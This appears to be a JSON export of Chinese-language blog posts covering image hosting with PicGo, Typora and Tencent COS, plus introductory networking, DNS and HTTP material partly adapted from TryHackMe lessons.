[{"content":"图床服务搭建过程 简介 图床服务提供图片存储、图片加工处理、图片全网分发等功能，为全球无数的博客网站和社区论坛提供了后端图片服务支撑。开发者们可以使用腾讯云**对象存储（Cloud Object Storage，COS）**搭建图床服务，COS 是腾讯云提供的一种存储海量文件的分布式存储服务，提供了更丰富的功能、更优越的性能、更高的可靠性保障。\nCOS 用于图床场景的优势有：\n**低成本：**存储单价低，按量付费，用多少算多少，还有资源包优惠。 **不限速：**上传下载不限速，不再长时间等待 loading，访问质量也更好。 **高可用：**有高等级的 SLA 可用性保障，存储的数据有高达99.9999999999%的持久性保障。 **容量无限：**文件分布式存储，支持海量文件，容量按需使用。 实践场景 场景一：新增图片使用 COS 搭建图床服务 本场景使用到以下工具：\n﻿PicGo：一款支持多种云存储配置、快捷生成图片链接的工具。\n﻿Typora：一款轻量级 Markdown 编辑器，支持多种输出格式，支持将本地图片一键上传至图床。\n操作步骤 步骤一 安装 PicGo 并设置腾讯云 COS 服务相关参数。\n在 PicGo 官网 下载和安装 PicGo 后，在图床设置里找到腾讯云 COS，并配置以下相关参数项：\nCOS 版本：选择 COS v5。\n设定 Secretld：开发者拥有的项目身份识别 ID，用于身份认证，可在 API 密钥管理 页面中创建和获取。\n设定 SecretKey：开发者拥有的项目身份密钥，可在 API 密钥管理 页面获取。\n设定 Bucket：存储桶，COS 中用于存储数据的容器。有关存储桶的进一步说明，请参见 存储桶概述 文档。\n设定 AppId：开发者访问 COS 服务时拥有的用户维度唯一资源标识，用以标识资源，可在 API 密钥管理 页面获取。\n设定存储区域：存储桶所属地域信息，枚举值可参见 可用地域 文档，例如 ap-beijing、ap-hongkong、eu-frankfurt 等。\n设定存储路径：图片存放到 COS 存储桶中的路径。\n设定自定义域名：可选，若您为上方的存储空间配置了自定义源站域名，则可填写。相关介绍可参见 开启自定义源站域名。\n设定网址后缀：通过在网址后缀添加 COS 数据处理参数实现图片压缩、裁剪、格式转换等操作，相关介绍可参见 图片处理。\n步骤二 设置 typora（可选）\n设置指引如下：\n2.1 在 typora 的偏好设置的图像中，进行如下配置：\n2.2 重启 typora，使设置生效。\n2.3 进入 typora 编辑器区域，直接拖放或粘贴图片，即可上传图片并自动替换为 COS 文件链接。（如果粘贴后没有自动替换为 COS 链接，可以检查 PicGo 中的 server 设置是否已打开）。\n场景二：将原图床仓库图片快速迁移到腾讯云 COS 以某图床服务举例，您可以找到本地图床文件夹，或从线上下载完整文件夹，并将文件夹中所有图片转存到 COS 存储桶。最后再统一替换链接域名即可恢复网站。\n操作步骤 下载原图床服务的图片。 登录原图床网站页面，下载此前已上传的图片文件夹。\n创建 COS 存储桶并设置防盗链。 2.1 注册腾讯云账号，创建一个访问权限为公有读私有写的存储桶，操作指引请参见 创建存储桶。\n2.2 创建存储桶后，在存储桶里打开防盗链设置，避免图片被盗刷，操作指引请参见 设置防盗链。\n上传文件夹到存储桶。 在刚才已创建的存储桶里，单击上传文件夹，将刚才准备好的图片文件夹，上传到 COS 存储桶。操作指引请参见 上传对象。\n全局替换链接域名 在 COS 控制台存储桶概览页，复制存储桶默认域名（也可以绑定自定义 CDN 加速域名）。使用常用代码编辑器，对项目全局搜索替换失效链接前缀为 COS 存储桶默认域名。\nvscode 搜索替换示例：\nsublime text 搜索替换示例：\n","date":"2025-03-20T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background04.jpg","permalink":"https://Yerucrem.github.io/p/%E4%BD%BF%E7%94%A8-picgo-typora-cos-%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A%E6%9C%8D%E5%8A%A1/","title":"使用 PicGo+Typora+COS 搭建图床服务"},{"content":"网络基础 LAN简介 多年来，已经对各种网络设计进行了实验和实施。对于网络，当我们提到术语 “拓扑” 时，我们实际上指的是手头网络的设计或外观。下面我们来讨论一下这些拓扑的优缺点。\n星形拓扑 星形拓扑的主要前提是设备通过中央网络设备（如交换机或集线器）单独连接。这种拓扑是当今最常见的拓扑，因为它具有可靠性和可扩展性 - 尽管成本高昂。\n发送到此拓扑中设备的任何信息都通过它所连接的中央设备发送。让我们在下面探讨一下这种拓扑的一些优点和缺点：\n由于此拓扑需要更多的布线和购买专用网络设备，因此它比任何其他拓扑都更昂贵。然而，尽管成本增加，但这确实提供了一些显着的优势。例如，这种拓扑本质上更具可扩展性，这意味着随着网络需求的增加，很容易添加更多设备。\n遗憾的是，网络规模越大，保持网络正常运行所需的维护就越多。这种对维护的依赖增加也会使故障排除变得更加困难。此外，星形拓扑结构仍然容易出现故障 - 尽管有所减少。例如，如果连接设备的集中式硬件发生故障，这些设备将无法再发送或接收数据。值得庆幸的是，这些集中式硬件设备通常很强大。\n总线拓扑 这种类型的连接依赖于称为主干电缆的单个连接。这种类型的拓扑类似于树的叶子，因为设备（叶子）从此电缆上的树枝所在的位置开始。\n由于发往每个设备的所有数据都沿着同一根电缆传输，因此如果拓扑中的设备同时请求数据，则很快就会变得缓慢和瓶颈。这种瓶颈还会导致非常困难的故障排除，因为很快就会变得难以识别哪个设备遇到了问题，所有数据都沿着同一路径传输。\n然而，话虽如此，总线拓扑是更容易设置且更具成本效益的拓扑之一，因为它们需要花费，例如用于连接这些设备的布线或专用网络设备。\n最后，总线拓扑的另一个缺点是，在发生故障时几乎没有冗余。这个缺点是因为沿主干电缆存在单点故障。如果此电缆断开，设备将无法再沿总线接收或传输数据。\n环形拓扑 环形拓扑（也称为令牌拓扑）具有一些相似之处。计算机等设备直接相互连接以形成一个环路，这意味着几乎不需要布线，并且对专用硬件（例如在星形拓扑中）的依赖较小。\n环形拓扑的工作原理是跨循环发送数据，直到数据到达目标设备，并使用循环中的其他设备转发数据。有趣的是，如果设备没有要发送的数据，则它只会从此拓扑中的另一台设备发送接收到的数据。如果设备恰好有数据要发送，它将先发送自己的数据，然后再从另一台设备发送数据。\n由于数据只有一个方向可以穿过此拓扑，因此对出现的任何故障进行故障排除相当容易。然而，这是一把双刃剑，因为它不是一种有效的数据通过网络传输的方式，因为它可能必须先访问许多多个设备才能到达预期的设备。\n最后，环形拓扑不太容易出现瓶颈，例如在总线拓扑中，因为大量流量不会在任何时候通过网络传输。但是，这种拓扑的设计确实意味着诸如电缆切断或设备损坏等故障将导致整个网络中断。\n什么是交换机？ 交换机是网络中的专用设备，旨在聚合多个其他设备，例如计算机、打印机或任何其他使用以太网的支持联网的设备。这些不同的设备插入交换机的端口。交换机通常位于较大的网络中，例如企业、学校或类似规模的网络，其中有许多设备可以连接到网络。交换机可以通过 4、8、16、24、32 和 64 端口来连接大量设备，以便设备插入。\n交换机比较小的同类产品（集线器/中继器）效率更高。交换机跟踪连接到哪个端口的设备。这样，当它们收到数据包时，它不会像集线器那样将该数据包重复到每个端口，而是将其发送到预期目标，从而减少网络流量。\n交换机和路由器都可以相互连接。这样做的能力通过为数据添加多个路径来增加网络的冗余（可靠性）。如果一条路径出现故障，则可以使用另一条路径。虽然这可能会降低网络的整体性能，因为数据包必须花费更长的时间来传输，但没有停机时间 - 考虑到替代方案，这是一个很小的代价。\n什么是路由器？ 路由器的工作是连接网络并在它们之间传递数据。它通过使用路由来实现这一点（因此得名 router）\n路由是给跨网络传输数据的过程的标签。路由涉及在网络之间创建路径，以便成功传送此数据。\n当设备通过许多路径连接时，路由非常有用，如下面的示例图所示。\n子网划分入门 正如我们之前在整个模块中讨论的那样，网络可以找到各种形状和大小 - 从小到大。子网划分是指将网络在其内部拆分为更小的微型网络。把它想象成为你的朋友切蛋糕。只有一定数量的蛋糕可以吃，但每个人都想分一杯羹。子网划分就是你决定谁得到什么份额，并保留这个比喻蛋糕的这样一块。\n以一家企业为例;您将拥有不同的部门，例如：\n会计学 金融 人力资源 虽然您知道在现实生活中将信息发送到正确的部门的位置，但网络也需要知道。网络管理员使用子网划分对网络的特定部分进行分类和分配，以反映这一点。\n子网划分是通过拆分网络可容纳的主机数量来实现的，该主机数由称为子网掩码的数字表示。\n正如我们所记得的，IP 地址由四个称为八位字节的部分组成。子网掩码也是如此，它也表示为 4 个字节 （32 位） 的数字，范围从 0 到 255 （0-255）。\n子网以三种不同的方式使用 IP 地址：\n确定网络地址 确定主机地址 确定默认网关 让我们将这三个部分分为下表以了解它们的用途：\n类型 目的 解释 例 网络地址 此地址标识实际网络的起点，并用于标识网络的存在。 例如，IP 地址为 192.168.1.100 的设备将位于由 192.168.1.0 标识的网络上 192.168.1.0 主机地址 此处的 IP 地址用于标识子网上的设备 例如，设备的网络地址为 192.168.1.1 192.168.1.100 默认网关 默认网关地址是分配给网络上设备的特殊地址，该地址能够将信息发送到另一个网络 任何需要发送到不在同一网络上的设备（即不在 192.168.1.0 上）的数据都将被发送到此设备。这些设备可以使用任何主机地址，但通常使用网络中的第一个或最后一个主机地址（.1 或 .254） 192.168.1.254 现在，在小型网络中，例如在家中，您将位于一个子网上，因为您一次需要连接超过 254 台设备的可能性不大。\n但是，企业和办公室等场所将拥有更多的此类设备（PC、打印机、相机和传感器），这些设备将进行子网划分。\n子网划分提供了一系列好处，包括：\n效率 安全 完全控制 稍后我们将继续探讨子网划分如何提供这些好处;但是，就目前而言，我们需要了解的只是它的安全元素。让我们以街上的典型咖啡馆为例。这家咖啡馆将有两个网络：\n一个用于员工、收银机和设施的其他设备 一个供公众用作热点 子网划分允许您将这两个用例彼此分开，同时获得连接到更大网络（如 Internet）的好处。\nARP 回顾我们之前的任务，设备可以有两个标识符：MAC 地址和 IP 地址，简称 A ddress Resolution Protocol 或简称 ARP，是负责允许设备在网络上识别自己的技术。\n简单地说，ARP 允许设备将其 MAC 地址与网络上的 IP 地址相关联。网络上的每台设备都将保留与其他设备关联的 MAC 地址的日志。\n当设备希望与其他设备通信时，它们将向整个网络发送广播，以搜索特定设备。设备可以使用 ARP 查找设备的 MAC 地址（以及物理标识符）以进行通信。\nARP 是如何工作的？\n网络中的每个设备都有一个用于存储信息的分类账，称为缓存。在 ARP 上下文中，此缓存存储网络上其他设备的标识符。\n为了将这两个标识符（IP 地址和 MAC 地址）映射在一起，ARP 发送两种类型的消息：\nARP （ARP）请求 ARP （ARP）答 发送 ARP 请求时，会在网络上向其他设备广播一条消息，询问“拥有此 IP 地址的 mac 地址是什么？当其他设备收到该消息时，它们只有在拥有该 IP 地址时才会响应，并将发送包含其 MAC 地址的 ARP 回复 。请求设备现在可以记住此映射并将其存储在其 ARP 缓存中以备将来使用。\n下图说明了此过程：\nOSI模型 什么是OSI OSI 模型（或 Open Systems Interconnection 模型）是网络中使用的基本模型。 这个关键模型提供了一个框架，规定了所有联网设备将如何发送、接收和解释数据。\nOSI 模型的主要优点之一是，设备在与其他设备通信时可以在网络上具有不同的功能和设计。通过遵循 OSI 模型一致性的网络发送的数据可以被其他设备理解。\nOSI 模型由七层组成，如下图所示。每个层都有一组不同的职责，从第 7 层到第 1 层排列。\n在数据经过的每一层，都会发生特定的流程，并将信息添加到这些数据中，这就是我们将在本次会议中即将讨论的任务中讨论的内容。但是，现在，我们只需要了解此过程称为封装以及下图中 OSI 模型的外观：\n第一层 物理层 此层是最容易掌握的层之一。简单地说，此层引用网络中使用的硬件的物理组件，是您将找到的最低层。设备使用电信号在二进制编号系统（1 和 0）中相互传输数据。\n例如，连接设备的以太网电缆，如下图所示：\n第二层 数据链路层 数据链路层侧重于传输的物理寻址。它从网络层接收数据包（包括远程计算机的 IP 地址），并添加接收端点的物理 MAC（媒体访问控制）地址。每台支持网络的计算机内部都有一个 Network Interface Card （NIC）， 它带有一个唯一的 MAC 地址来识别它。\nMAC 地址由制造商设置并实际烧录到卡中;它们无法更改 - 尽管它们可以被欺骗。当信息通过网络发送时，它实际上是用于标识信息的确切发送位置的物理地址。\n此外，数据链路层的工作还包括以适合传输的格式呈现数据。\n第三层 网络层 OSI 模型的第三层（网络层）是路由和重新组装数据的魔力发生的地方（从这些小块到更大的块）。首先，路由只是确定这些数据块应发送到的最佳路径。\n虽然这一层的一些协议准确地确定了数据到达设备的 “最佳” 路径，但我们只能在网络模块的这个阶段知道它们的存在。简而言之，这些协议包括 OSPF （Open S hortest Path First） 和 RIP （Routing Information Protocol）。决定采用哪种路线的因素由以下因素决定：\n哪条路最短？即，数据包需要传输的设备数量最少。 什么路径最可靠？即，数据包之前是否在该路径上丢失过？ 哪条路径的物理连接速度更快？即，一条路径是使用铜缆连接（较慢）还是光纤（相当快）？ 在这一层，一切都通过 IP 地址处理，例如 192.168.1.100。能够使用 IP 地址传输数据包的设备（例如路由器）称为第 3 层设备，因为它们能够在 OSI 模型的第三层工作。\n第四层 传输层 OSI 模型的第 4 层在通过网络传输数据方面起着至关重要的作用，可能有点难以掌握。在设备之间发送数据时，它遵循两种不同的协议之一，这些协议是根据几个因素决定的：\nTCP 协议 UDP 协议 让我们从 TCP 开始。Transmission Control Protocol （TCP）。 顾名思义，该协议在设计时考虑了可靠性和保证。此协议在两个设备之间保留一个持续连接，用于发送和接收数据所需的时间。\n不仅如此，TCP 还将错误检查纳入其设计中。错误检查是 TCP 如何保证从会话层（第 5 层）中的小块发送的数据随后以相同的顺序接收和重组。\n让我们在下表中总结 TCP 的优缺点：\n**TCP 的优点 ** **TCP 的缺点 ** 保证数据的准确性。 需要在两个设备之间建立可靠的连接。如果未收到一小块数据，则无法使用整个数据块。 能够同步两个设备，以防止彼此被数据淹没。 慢速连接可能会给另一台设备带来瓶颈，因为连接将始终在接收计算机上保留。 执行更多的过程以实现可靠性。 TCP 比 UDP 慢得多，因为使用此协议的设备必须完成更多工作。 TCP 用于文件共享、Internet 浏览或发送电子邮件等情况。这种用法是因为这些服务要求数据准确和完整（拥有半个文件不好！\n在下图中，我们可以看到猫的图片是如何从 “webserver” 分解成小块数据（称为数据包）的，其中 “computer” 将猫的图片重新构建为正确的顺序。\n现在让我们进入 User Datagram Protocol（或简称 UDP）。该协议不如它的兄弟 TCP 协议先进。它没有 TCP 提供的许多功能，例如错误检查和可靠性。事实上，通过 UDP 发送的任何数据都会发送到计算机，无论它是否到达那里。两个设备之间没有同步或保证;只是希望最好，手指交叉。\n虽然这听起来很不利，但它确实有其优点，我们将在下表中进行布局：\nUDP 的优势 UDP 的缺点 UDP 比 TCP 快得多。 UDP 不关心是否收到数据。 UDP 让应用程序层（用户软件）决定是否可以控制数据包的发送速度。 从这个意义上说，它对软件开发人员来说是相当灵活的。 UDP 不会像 TCP 那样在设备上保留连续连接。 这意味着不稳定的连接会给用户带来糟糕的体验。 使用与之前相同的示例，我们现在可以看到“计算机”只接收了数据包 #1 和 #3，这意味着缺少一半的图像。\nUDP 在发送小块数据的情况下非常有用。\nTCP三次握手四次挥手 三次握手与四次挥手是TCP协议中用于建立和终止连接的关键机制，确保数据传输的可靠性。以下是详细解释：\n一、三次握手（建立连接） 目的：确保客户端与服务器双方具备收发数据的能力。 过程：\nSYN（客户端 → 服务器） 客户端发送SYN报文（SYN=1，seq=x），进入SYN_SENT状态。 作用：请求建立连接，并初始化序列号。 SYN-ACK（服务器 → 客户端） 服务器回应SYN-ACK报文（SYN=1，ACK=1，ack=x+1，seq=y），进入SYN_RCVD状态。 作用：确认收到请求，同时发送自身序列号。 ACK（客户端 → 服务器） 客户端发送ACK报文（ACK=1，ack=y+1，seq=x+1），双方进入ESTABLISHED状态。 作用：确认服务器的响应，完成连接建立。 为什么需要三次？\n防止已失效的请求报文突然传到服务器（如网络延迟导致重复SYN），避免资源浪费。 二、四次挥手（终止连接） 目的：确保双方数据收发完毕后再安全关闭连接。 过程：\nFIN（主动关闭方 → 被动关闭方） 主动方（如客户端）发送FIN报文（FIN=1，seq=u），进入FIN_WAIT_1状态。 作用：表示不再发送数据，但可接收数据。 ACK（被动关闭方 → 主动关闭方） 被动方回应ACK报文（ACK=1，ack=u+1，seq=v），进入CLOSE_WAIT状态。 作用：确认收到关闭请求，但可能继续发送未完成的数据。 FIN（被动关闭方 → 主动关闭方） 被动方发送FIN报文（FIN=1，ACK=1，ack=u+1，seq=w），进入LAST_ACK状态。 作用：表示自身数据已发送完毕，请求关闭连接。 ACK（主动关闭方 → 被动关闭方） 主动方回应ACK报文（ACK=1，ack=w+1，seq=u+1），进入TIME_WAIT状态（等待2MSL时间）。 作用：确认最终关闭，防止最后一个ACK丢失导致被动方重传FIN。 为什么需要四次？\nTCP是全双工通信，双方需独立关闭发送通道。 三、三次握手：建立连接（确保双方能正常通话） 场景：小明想约小美商量聚会计划。 第一次握手（SYN） 小明打电话给小美：“小美，你能听到我说话吗？”（发送 SYN 包） 状态：小明等待回应（SYN_SENT）。 第二次握手（SYN-ACK） 小美接听电话：“小明，我能听到！你能听到我吗？”（回复 SYN-ACK 包） 状态：小美等待小明确认（SYN_RCVD）。 第三次握手（ACK） 小明回应：“我能听到！”（发送 ACK 包） 状态：双方正式通话（ESTABLISHED），开始讨论聚会细节（数据传输）。 为什么需要三次？ 如果小明喊完第一句后，小美没回应，小明会重拨（避免网络延迟导致重复连接）。三次确认确保双方 ​​“听得到”且“能回应”​。\n四、四次挥手：断开连接（确保双方说完所有话） 场景：讨论结束，两人要挂电话。 第一次挥手（FIN） 小明说：“我要说的都说完了，挂了吧！”（发送 FIN 包） 状态：小明等待小美确认（FIN_WAIT_1）。 第二次挥手（ACK） 小美回应：“好的，我知道你说完了。”（回复 ACK 包） 状态：小美可能还有话要说（CLOSE_WAIT），小明等待小美结束（FIN_WAIT_2）。 第三次挥手（FIN） 小美补充：“我也说完了，挂了吧！”（发送 FIN 包） 状态：小美等待小明确认（LAST_ACK）。 第四次挥手（ACK） 小明最后回应：“好的，再见！”（发送 ACK 包） 状态：小明等待片刻（TIME_WAIT，防止小美没收到确认），双方挂断（CLOSED）。 为什么需要四次？ 因为两人要 ​各自确认“我说完了”且“你也说完了”​。小明先结束发言权，小美可能还有补充，最后双方才真正挂断。\n五、总结 三次握手：像打电话时的三次确认（“听得到吗？”→“听得到！你呢？”→“我也听得到！”）。 四次挥手：像挂电话时的四次告别（“我说完了”→“好”→“我也说完了”→“好，再见！”）。 技术映射：\nSYN：发起通话请求（“你能听到吗？”）。 ACK：确认收到消息（“好的”）。 FIN：结束发言（“我挂了啊”）。 第五层 会话层 一旦数据从表示层（第 6 层）正确转换或格式化，会话层（第 5 层）将开始创建和维护与数据目标的其他计算机的连接。建立连接后，将创建一个会话。当此连接处于活动状态时，会话也处于活动状态。\n会话层还负责关闭连接（如果连接有一段时间未使用或丢失）。此外，会话可以包含“检查点”，如果数据丢失，则只需要发送最新的数据，从而节省带宽。\n值得注意的是，会话是唯一的，这意味着数据不能在不同的会话之间传输，而实际上只能在每个会话之间传输。\n第六层 表示层 OSI 模型的第 6 层是开始进行标准化的层。由于软件开发人员可以以不同的方式开发任何软件，例如电子邮件客户端，因此无论软件如何工作，数据仍然需要以相同的方式处理。\n该层充当数据进出应用程序层（第 7 层）的转换器。接收计算机还将理解以一种格式发送到计算机的数据，这些数据以另一种格式发送给计算机。例如，当您发送电子邮件时，其他用户可能有其他电子邮件客户端发送给您，但电子邮件的内容仍需要显示相同的内容。\n数据加密（如访问安全站点时的 HTTPS）等安全功能位于此层。\n第七层 应用层 SI 模型的应用层是您最熟悉的层。之所以如此熟悉，是因为应用程序层是协议和规则所在的层，用于确定用户应如何与发送或接收的数据进行交互。\n日常应用程序（如电子邮件客户端、浏览器或文件服务器浏览软件（如 FileZilla）为用户提供了一个友好的 G 实时用户界面 （GUI）， 以便与发送或接收的数据进行交互。其他协议包括 DNS （Domain Name System），这是网站地址转换为 IP 地址的方式。\n","date":"2025-03-20T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background06.jpg","permalink":"https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/","title":"网络基础"},{"content":"DNS详细信息 DNS（域名系统）为我们提供了一种与 Internet 上的设备进行通信的简单方法，而无需记住复数。就像每栋房子都有一个直接向其发送邮件的唯一地址一样，互联网上的每台计算机都有自己唯一的地址来与之通信，称为 IP 地址。IP 地址类似于以下 104.26.10.229,4 组数字，范围从 0 到 255，用句点分隔。当您想访问一个网站时，记住这组复杂的数字并不十分方便，而这正是 DNS 可以提供帮助的地方。因此，您可以记住 tryhackme.com，而不是记住 104.26.10.229。\n域层次结构 TLD （顶级域名） TLD 是域名最右侧的部分。因此，例如，tryhackme.com TLD 是 .com。TLD 有两种类型，gTLD（通用顶级域名）和 ccTLD（国家代码顶级域名）。从历史上看，gTLD 旨在告诉用户域名的用途;例如，.com 用于商业目的，.org 用于组织，.edu 用于教育，.gov 用于政府。ccTLD 用于地理目的，例如 .ca 表示位于加拿大的站点，.co.uk 表示位于英国的站点，依此类推。由于这种需求，涌入了从 .online 、 .club 、 .website 、 .biz 等 新 gTLD 。\n二级域 以 tryhackme.com 为例，.com部分是 TLD，tryhackme 是二级域名。注册域名时，二级域名限制为 63 个字符 + TLD，并且只能使用 a-z 0-9 和连字符（不能以连字符开头或结尾或有连续的连字符）。\n子域 子域位于二级域的左侧，使用句点分隔它;例如，在 name admin.tryhackme.com 中，admin 部分是 subdomain。子域名的创建限制与二级域名相同，限制为 63 个字符，并且只能使用 a-z 0-9 和连字符（不能以连字符开头或结尾，也不能有连续的连字符）。您可以使用多个子域（用句点拆分）来创建更长的名称，例如 jupiter.servers.tryhackme.com。但长度必须保持在 253 个字符或更少。您可以为域名创建的子域数量没有限制。\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background07.jpg","permalink":"https://Yerucrem.github.io/p/dns-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/","title":"DNS 详细信息"},{"content":"HTTP协议 什么是 HTTP？（超文本传输协议） HTTP 是您查看网站时使用的工具，由 Tim Berners-Lee 和他的团队在 1989 年至 1991 年间开发。HTTP 是用于与 Web 服务器通信以传输网页数据（无论是 HTML、图像、视频等）的规则集。\n什么是 HTTPS？ （安全超文本传输协议） HTTPS 是 HTTP 的安全版本。 HTTPS 数据是加密的，因此它不仅可以阻止人们看到您接收和发送的数据，还可以确保您正在与正确的 Web 服务器通信，而不是冒充它。\n什么是 URL？（统一资源定位器） 如果您曾经使用过 Internet，那么您以前也使用过 URL。URL 主要是有关如何访问 Internet 上的资源的指令。下图显示了 URL 及其所有功能的外观（它不会在每个请求中使用所有功能）。\nScheme:这指示使用什么协议来访问资源，例如 HTTP、HTTPS、FTP（文件传输协议）。 **User:**某些服务需要身份验证才能登录，您可以在 URL 中输入用户名和密码才能登录。 **Host:**您要访问的服务器的域名或 IP 地址。 **Port:**您要连接的端口，通常为 80 用于 HTTP，443 用于 HTTPS，但这可以托管在 1 - 65535 之间的任何端口上。 **Path:**您尝试访问的资源的文件名或位置。 **Query String:**可以发送到请求路径的额外信息位。例如，/blog？id=1 将告知博客路径您希望接收 ID 为 1 的博客文章。 Fragment: 这是对请求的实际页面上的位置的引用。这通常用于内容较长的页面，并且可以将页面的某个部分直接链接到该页面，因此用户一旦访问该页面即可查看该页面。 提出请求 只需一行 GET / HTTP/1.1 就可以向 Web 服务器发出请求\n但要获得更丰富的 Web 体验，您还需要发送其他数据。这些其他数据以所谓的 headers 形式发送，其中 header 包含额外的信息，以提供给您正在与之通信的 Web 服务器，但我们将在 Header 任务中对此进行更多介绍。\n请求示例：\n1 2 3 4 5 6 7 8 9 10 GET / HTTP/1.1 Host: tryhackme.com User-Agent: Mozilla/5.0 Firefox/87.0 Referer: https://tryhackme.com/ 第 1 行： 此请求将发送 GET 方法（ 在 HTTP 方法 任务中，有更多相关信息），请求带有 / 的主页，并告知 Web 服务器我们使用的是 HTTP 协议版本 1.1。\n第 2 行： 我们告诉 Web 服务器我们希望网站 tryhackme.com\n第 3 行： 我们告诉 Web 服务器我们使用的是 Firefox 版本 87 浏览器\n第 4 行： 我们告诉 Web 服务器，将我们引荐到此网页的网页是 https://tryhackme.com\n**第 5 行：**HTTP 请求始终以空行结尾，以通知 Web 服务器请求已完成。\n响应示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 HTTP/1.1 200 OK Server: nginx/1.15.8 Date: Fri, 09 Apr 2021 13:34:03 GMT Content-Type: text/html Content-Length: 98 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;TryHackMe\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Welcome To TryHackMe.com \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 第 1 行： HTTP 1.1 是服务器正在使用的 HTTP 协议版本，然后是 HTTP 状态代码（在本例中为“200 Ok”），这告诉我们请求已成功完成。\n第 2 行： 这告诉我们 Web 服务器软件和版本号。\n第 3 行： Web 服务器的当前日期、时间和时区。\n第 4 行： Content-Type 标头告诉客户端将发送哪种信息，例如 HTML、图像、视频、pdf、XML。\n第 5 行： Content-Length 告诉客户端响应多长时间，这样我们就可以确认没有丢失数据\n**第 6 行：**HTTP 响应包含一个空行，用于确认 HTTP 响应的结束。\n第 7-14 行： 已请求的信息，在本例中为主页。\nHTTP方法 GET Request 这用于从 Web 服务器获取信息。\nPOST Request 这用于将数据提交到 Web 服务器并可能创建新记录\nPUT Request 这用于将数据提交到 Web 服务器以更新信息\nDELETE Request 这用于从 Web 服务器中删除信息/记录。\nHTTP 协议状态代码： 在上一个任务中，您了解到，当 HTTP 服务器响应时，第一行始终包含一个状态代码，告知客户端其请求的结果以及可能如何处理该请求。这些状态代码可以分为 5 个不同的范围：\n100-199 - Information Response 100-199 - 信息响应 发送这些请求是为了告诉客户端其请求的第一部分已被接受，他们应该继续发送请求的其余部分。这些代码不再很常见。 200-299 - 成功 此状态代码范围用于告诉客户端其请求成功。 300-399 - 重定向 这些用于将客户端的请求重定向到另一个资源。这可以是不同的网页，也可以是完全不同的网站。 400-499 - Client Errors 400-499 - 客户端错误 用于通知客户端其请求有错误。 500-599 - 服务器错误 这是为服务器端发生的错误保留的，通常表示处理请求的服务器存在相当大的问题。 常见的 HTTP 状态代码： 有很多不同的 HTTP 状态代码，这还不包括应用程序甚至可以定义自己的 HTTP 状态代码，我们将介绍您可能遇到的最常见的 HTTP 响应：\n200 - OK 200 - 正常 请求已成功完成。 201 - Created 201 - 已创建 已创建资源（例如，新用户或新博客文章）。 301 - Moved Permanently 301 - 永久移动 这会将客户的浏览器重定向到新网页，或告诉搜索引擎该页面已移至其他位置并改为查看那里。 302 - Found 302 - 找到 与上述永久重定向类似，但顾名思义，这只是一个临时更改，在不久的将来可能会再次更改。 400 - Bad Request 400 - 错误请求 这会告诉浏览器他们的请求中有错误或缺失。如果请求的 Web 服务器资源需要客户端未发送的特定参数，则有时可以使用此方法。 401 - Not Authorised 401 - 未授权 在您授权 Web 应用程序（通常是使用用户名和密码）之前，您当前不允许查看此资源。 403 - Forbidden 403 - 禁止 无论您是否登录，您都无权查看此资源。 405 - Method Not Allowed 405 - 不允许使用 资源不允许此方法请求，例如，当资源需要 POST 请求时，您向资源 /create-account 发送 GET 请求。 404 - Page Not Found 404 - 未找到页面 您请求的页面/资源不存在。 500 - Internal Service Error 500 - 内部服务错误 服务器在您的请求中遇到了某种错误，它不知道如何正确处理。 503 - Service Unavailable 503 - 服务不可用 此服务器无法处理您的请求，因为它已过载或停机进行维护。 Headers 头 标头是您在发出请求时可以发送到 Web 服务器的附加数据位。\n尽管在发出 HTTP 请求时不严格要求标头，但您会发现很难正确查看网站。\n通用请求标头 这些是从客户端（通常是您的浏览器）发送到服务器的标头。\nHost: 一些 Web 服务器托管多个网站，因此通过提供主机标头，您可以告诉它您需要哪个网站，否则您只会收到服务器的默认网站。\n**User-Agent:**这是您的浏览器软件和版本号，告诉 Web 服务器您的浏览器软件有助于它为您的浏览器正确格式化网站，并且 HTML、JavaScript 和 CSS 的某些元素仅在某些浏览器中可用。\n**Content-Length:**将数据发送到 Web 服务器（例如在表单中）时，内容长度会告知 Web 服务器 Web 请求中预期有多少数据。这样，服务器可以确保它不会丢失任何数据。\n**Accept-Encoding:**告诉 Web 服务器浏览器支持哪些类型的压缩方法，以便可以缩小数据以通过 Internet 传输。\n**Cookie:**发送到服务器以帮助记住您的信息的数据（有关更多信息，请参阅 Cookie 任务）。\n常见响应标头 这些是在请求后从服务器返回给客户端的标头。\n**Set-Cookie:**要存储的信息将在每个请求中发送回 Web 服务器（请参阅 cookie 任务以了解更多信息）。\n**Cache-Control:**在浏览器再次请求响应之前，将响应内容存储在浏览器的缓存中多长时间。\nContent-Type: 这会告诉客户端返回什么类型的数据，即 HTML、CSS、JavaScript、图像、PDF、视频等。使用 content-type 标头，浏览器就可以知道如何处理数据。\n**Content-Encoding:**通过 Internet 发送数据时，使用了什么方法来压缩数据以使其更小。\nCookies 它们只是存储在您计算机上的一小段数据。当您从 Web 服务器收到 “Set-Cookie” 标头时，将保存 Cookie。然后，您发出的每个进一步请求，您都会将 cookie 数据发送回 Web 服务器。由于 HTTP 是无状态的（不会跟踪您以前的请求），因此 cookie 可用于提醒 Web 服务器您是谁、网站的一些个人设置或您以前是否访问过该网站。让我们看一下这个 HTTP 请求示例：\nCookie 可用于多种用途，但最常用于网站身份验证。cookie 值通常不是您可以看到密码的明文字符串，而是令牌（人类不容易猜到的唯一密码）。\n查看您的 Cookie 您可以在浏览器中使用开发人员工具轻松查看浏览器向网站发送的 Cookie。\n打开开发人员工具后，单击“Network”（网络）选项卡。此选项卡将向您显示浏览器请求的所有资源的列表。您可以单击每个选项以接收请求和响应的详细分类。如果您的浏览器发送了 Cookie，您将在请求的“Cookie”选项卡上看到这些 